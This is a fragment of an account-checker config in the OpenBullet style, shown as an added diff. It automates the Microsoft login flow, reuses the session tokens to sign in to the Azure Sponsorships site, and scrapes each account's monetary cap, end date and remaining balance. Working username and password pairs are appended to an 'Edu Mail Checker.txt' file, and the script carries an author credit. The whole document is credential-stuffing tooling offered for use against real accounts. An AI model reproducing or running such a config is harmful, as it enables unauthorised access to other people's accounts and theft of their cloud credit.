+    KEY "No tenant-identifying information found in either the request or implied by any provided credentials." 
+
+#sCtx PARSE "<SOURCE>" LR "\"flowToken\",\"sCtx\":\"" "\",\"" -> VAR "sCtx" 
+
+#sessionId PARSE "<SOURCE>" LR ",\"sessionId\":\"" "\",\"locale" -> VAR "sessionId" 
+
+#sFT PARSE "<SOURCE>" LR "\",\"sFT\":\"" "\",\"" -> VAR "sFT" 
+
+#canary PARSE "<SOURCE>" LR "\"canary\":\"" "\",\"" -> VAR "canary" 
+
+#canary FUNCTION URLEncode "<canary>" -> VAR "canary" 
+
+#kmsi REQUEST POST "https://login.microsoftonline.com/kmsi" 
+  CONTENT "LoginOptions=3&type=28&ctx=<sCtx>&hpgrequestid=<sessionId>&flowToken=<sFT>&canary=<canary>&i2=&i17=&i18=&i19=1723" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://login.microsoftonline.com/common/login" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 2016" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+
+#code PARSE "<SOURCE>" LR "ame=\"code\" value=\"" "\" /><inpu" -> VAR "code" 
+
+#token PARSE "<SOURCE>" LR "\"id_token\" value=\"" "\"" -> VAR "token" 
+
+#state PARSE "<SOURCE>" LR "\"state\" value=\"OpenIdConnect.AuthenticationProperties=" "\"" -> VAR "state" 
+
+#sessionstate PARSE "<SOURCE>" LR "session_state\" value=\"" "\"" -> VAR "sessionstate" 
+
+#Account REQUEST POST "https://www.microsoftazuresponsorships.com/Account/Login" 
+  CONTENT "code=<code>&id_token=<token>&state=OpenIdConnect.AuthenticationProperties%3D<state>&session_state=<sessionstate>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.microsoftazuresponsorships.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://login.microsoftonline.com/" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 2794" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: " 
+
+#Balance REQUEST GET "https://www.microsoftazuresponsorships.com/Balance" 
+  
+  HEADER "Host: www.microsoftazuresponsorships.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#TOTAL PARSE "<SOURCE>" LR "\"MonetaryCap\":" ",\"ProgressSn" CreateEmpty=FALSE -> CAP "TOTAL" 
+
+#End_Date PARSE "<SOURCE>" LR "EndDate\":\"" "T" CreateEmpty=FALSE -> CAP "End Date" 
+
+#Remaining_Balance PARSE "<SOURCE>" LR "RemainingBalance\":" ",\"CustomerCCListValues\":" CreateEmpty=FALSE -> CAP "Remaining Balance" 
+
+FUNCTION Constant "BY=@koussai_001" -> CAP "== CONFING ==https://portal.azure.com/==" 
+
+!#Edu_Mail_Checker UTILITY File "Edu Mail Checker.txt" AppendLines "<USER>:<PASS>" 
+
